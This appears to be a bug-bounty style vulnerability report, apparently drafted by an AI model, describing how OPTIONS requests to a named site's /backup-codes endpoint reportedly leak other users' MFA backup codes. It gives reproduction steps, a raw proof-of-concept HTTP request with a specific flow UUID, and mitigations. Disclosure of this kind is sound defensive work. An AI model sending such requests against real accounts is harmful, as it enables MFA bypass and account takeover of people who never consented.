## Vulnerability Report: Unauthorized Disclosure of MFA Backup Codes via HTTP Verb Tampering (OPTIONS)

### **Summary**

An Insecure Direct Object Reference (IDOR) and Verb Tampering vulnerability exists on the `/backup-codes` endpoint. While the application correctly implements authorization checks for `GET` requests, it fails to apply these same restrictions to `OPTIONS` requests. By sending an `OPTIONS` request with a valid `flow` UUID belonging to another user, an unauthenticated or cross-account attacker can retrieve that user's MFA backup codes, leading to a full account takeover.

---

### **Vulnerability Details**

- **Target URL:** `https://accounts.hytale.com/backup-codes`
    
- **Vulnerable Parameter:** `flow` (UUID)
    
- **Vulnerable HTTP Method:** `OPTIONS`
    
- **Classification:** Broken Access Control / IDOR / Verb Tampering
    

### **Description**

The application uses a `flow` UUID to identify specific authentication sessions. When a standard `GET` request is made, the backend validates the session cookie against the requested `flow`. However, the server also processes `OPTIONS` requests by returning the full body of the resource instead of just the communication metadata.

Crucially, the server **does not perform authorization checks** on the `OPTIONS` method, allowing any user to view the backup codes associated with a known `flow` ID.

---

### **Steps to Reproduce**

1. **Identify a Target:** Obtain a valid `flow` UUID for a target account (e.g., `d119edb6-3289-4780-a340-3ddeee6d5734`).
    
2. **Craft the Attack:** Using a tool like `Burp Suite` or `curl`, send an `OPTIONS` request to the endpoint:
    
    HTTP
    
    ```
    OPTIONS /backup-codes?flow=[TARGET_UUID] HTTP/2
    Host: accounts.hytale.com
    Origin: https://test.com
    ```
    
3. **Observe the Response:** Note that despite the lack of a valid session cookie for the target user, the server returns a `200 OK` response containing the plain-text MFA backup codes in the response body.
    

### **Impact**

An attacker who obtains a user's `flow` ID can bypass Multi-Factor Authentication (MFA) entirely. By retrieving the backup codes, the attacker can gain persistent access to the victim's account, leading to complete data compromise and account loss.

---

### **Supporting Evidence (PoC Request)**

HTTP

```
OPTIONS /backup-codes?flow=d119edb6-3289-4780-a340-3ddeee6d5734 HTTP/2
Host: accounts.hytale.com
User-Agent: Mozilla/5.0 (X11; Ubuntu; Linux x86_64; rv:148.0)
Origin: https://test.com

HTTP/2 200 OK
Content-Type: text/html
...
[Response Body containing Backup Codes]
```

### **Recommended Mitigation**

1. **Uniform Authorization:** Apply identical authorization and session-validation logic to all HTTP methods (`GET`, `POST`, `OPTIONS`, `HEAD`) for sensitive endpoints.
    
2. **Strict Method Handling:** Configure the web server or API gateway to only return headers (and no body) for `OPTIONS` requests, as per RFC 7231.
    
3. **UUID Protection:** Ensure that `flow` IDs are treated as sensitive tokens and are not leaked in logs or client-side referrer headers.
    

---

**Would you like me to help you format this into a specific template, or perhaps refine the "Impact" section to emphasize the severity of the MFA bypass?**